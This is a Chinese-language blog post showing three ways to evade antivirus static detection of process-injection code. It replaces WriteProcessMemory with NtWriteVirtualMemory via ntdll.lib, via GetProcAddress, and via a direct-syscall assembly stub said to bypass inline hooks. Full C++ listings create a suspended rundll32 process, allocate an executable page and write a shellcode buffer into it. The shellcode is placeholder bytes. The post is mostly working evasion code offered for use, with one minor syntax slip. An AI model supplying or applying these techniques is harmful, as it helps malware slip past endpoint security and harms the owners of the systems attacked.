>因为蚂蚁笔记官方图片服务器极其不稳定，如果本文出现图片加载不出的问题，请转到此链接查看：https://shimo.im/docs/VJyDCRwT3qJqjY89/ 


起因是我的 WriteProcessMemory API 被某 AV 静态查杀。刚好以此 API 为例给出三种替换 R3 API 为对应内核 API 进行免杀的方式。

代码都是从我自己的项目中复制的一些，所以有无关代码，看重点就好。

# 方法1：ntdll.lib

```
#include <stdio.h>
#include <windows.h>
#include <tchar.h>
#include <conio.h>
#include <iostream>
#include <tlhelp32.h>
#include <typeinfo>
#include "corecrt_wstring.h"


using namespace std;


#pragma comment(lib, "ntdll.lib")


extern "C" __declspec(dllimport) NTSTATUS NTAPI NtWriteVirtualMemory(
    IN HANDLE               ProcessHandle,
    IN PVOID                BaseAddress,
    IN PVOID                Buffer,
    IN ULONG                NumberOfBytesToWrite,
    OUT PULONG              NumberOfBytesWritten);


void _tmain(int argc, _TCHAR* argv[])
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    BOOL process_result = 0;
    BOOL memory_result = 0;
    BOOL context_result = 0;
    BOOL eip_result = 0;
    DWORD resume_result = 0;
    LPVOID rwxpage;
    CONTEXT threadContext;


    int length;
    unsigned char buf[] = "\xcc\xcc\xcc\xc3";
    length = sizeof(buf) / sizeof(buf[0]);


    wchar_t CommandLine[MAX_PATH] = { 0 };
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));


    /*step 0:判断机器是 32 还是 64 位，以此确定 32-bit 程序 notepad.exe 的路径*/
    const int nBitSys = GetSystemBits();
    if (nBitSys == 32)
    {
        wcscpy_s(CommandLine, L"C:\\Windows\\System32\\rundll32.exe");
    }
    if (nBitSys == 64)
    {
        wcscpy_s(CommandLine, L"C:\\Windows\\SysWOW64\\rundll32.exe");
    }


    /*step 1: 调用 CreateProcess 以挂起的方式（CREATE_SUSPENDED）创建进程*/
    process_result = CreateProcessW(NULL, CommandLine, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    if (!process_result)
    {
        _tprintf(_T("CreateProcess failed (%d).\n"), GetLastError());
        return;
    }


    /*step 2: 调用 VirtualAllocEx 函数申请一个可读、可写、可执行的内容*/
    //返回结果在 lpProcessInformation 结构体的 hProcess 成员中，是一个进程句柄
    if (pi.hProcess != NULL)
    {
        rwxpage = VirtualAllocEx(pi.hProcess, 0, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        printf("rwxpage = %p", rwxpage);


        /*step 3: 调用 WriteProcessMemory 将 Shellcode 数据写入刚申请的内存中*/
        if (rwxpage != 0) {
            /*memory_result = WriteProcessMemory(pi.hProcess, rwxpage, buf, length, NULL);*/
            memory_result = NtWriteVirtualMemory(
                pi.hProcess,
                rwxpage,
                buf,
                length,
                NULL);
        }
    }


    return;
}
```


**效果：**

![title](https://leanote.com/api/file/getImage?fileId=5f62f65eab64415d1c000606)

**技巧：**

文档化的 Nt/Zw 函数可通过 `include <winternl.h>` 直接获取函数签名。
我上面的代码是未文档化 API 的写法。



# 方法2：LoadLibrary → GetProcAddress

```
#include <Windows.h>
#include <iostream>
#include <wincrypt.h>
#include <string>
#include <tchar.h>
#include<vector>
#include <stdio.h>
#include <wchar.h>
#include <conio.h>
#include <tlhelp32.h>
#include <typeinfo>
#include "corecrt_wstring.h"
#pragma comment(lib, "crypt32.lib")


using namespace std;


void _tmain(int argc, _TCHAR* argv[])
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    BOOL process_result = 0;
    BOOL memory_result = 0;
    BOOL context_result = 0;
    BOOL eip_result = 0;
    DWORD resume_result = 0;
    LPVOID rwxpage;
    CONTEXT threadContext;


    int length;
    unsigned char buf[] = "\xcc\xcc\xcc\xc3";
    length = sizeof(buf) / sizeof(buf[0]);


    wchar_t CommandLine[MAX_PATH] = { 0 };
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));


    /*step 1: 调用 CreateProcess 以挂起的方式（CREATE_SUSPENDED）创建进程*/
    process_result = CreateProcessW(NULL, CommandLine, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    if (!process_result)
    {
        _tprintf(_T("CreateProcess failed (%d).\n"), GetLastError());
        return;
    }


    /*step 2: 调用 VirtualAllocEx 函数申请一个可读、可写、可执行的内容*/
    //返回结果在 lpProcessInformation 结构体的 hProcess 成员中，是一个进程句柄
    if (pi.hProcess != NULL)
    {
        rwxpage = VirtualAllocEx(pi.hProcess, 0, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        printf("rwxpage = %p", rwxpage);


        /*step 3: 调用 WriteProcessMemory 将 Shellcode 数据写入刚申请的内存中*/
        if (rwxpage != 0) {
            //memory_result = WriteProcessMemory(pi.hProcess, rwxpage, buf, length, NULL);
            typedef NTSTATUS(WINAPI* _NtWriteVirtualMemory)(
                HANDLE ProcessHandle,
                PVOID  BaseAddress,
                PVOID  Buffer,
                ULONG  NumberOfBytesToWrite,
                PULONG NumberOfBytesWritten
                );
            typedef ULONG(WINAPI* _RtlNtStatusToDosError)(
                NTSTATUS Status
                );
            HMODULE hmNtdll = GetModuleHandle(L"ntdll.dll");
            if (hmNtdll != 0)
            {
                _NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(hmNtdll, "NtWriteVirtualMemory");
                _RtlNtStatusToDosError RtlNtStatusToDosError = (_RtlNtStatusToDosError)GetProcAddress(hmNtdll, "RtlNtStatusToDosError");
                if (!NtWriteVirtualMemory || !RtlNtStatusToDosError)
                {
                    return;
                }
                NTSTATUS status = NtWriteVirtualMemory(pi.hProcess, rwxpage, buf, length, NULL);
                if (!NT_SUCCESS(status))
                {
                    SetLastError(RtlNtStatusToDosError(status));
                    _tprintf(_T("NtWriteVirtualMemory failed (%d).\n"), GetLastError());
                    return;
                }
            }
        }


    return;
}
```


# 方法3：syscall

![title](https://leanote.com/api/file/getImage?fileId=5f62f6c5ab64415d1c00060c)


```
;.asm

.code


NtWriteVirtualMemory proc
	mov     r10, rcx       
	mov     eax, 3Ah 
	syscall
	ret


NtWriteVirtualMemory endp
```

**优点：**


可绕过 inline hook。


-------------------


# 参考文档：

- https://j00ru.vexillium.org/syscalls/nt/64/  最全的系统调用号
- https://www.ired.team/offensive-security/defense-evasion/using-syscalls-directly-from-visual-studio-to-bypass-avs-edrs 最后的代码示例很差
- https://www.crowdstrike.com/blog/state-of-exploit-development-part-2/
- https://idiotc4t.com/defense-evasion/dynamic-get-syscallid 跟师傅的博客学到很多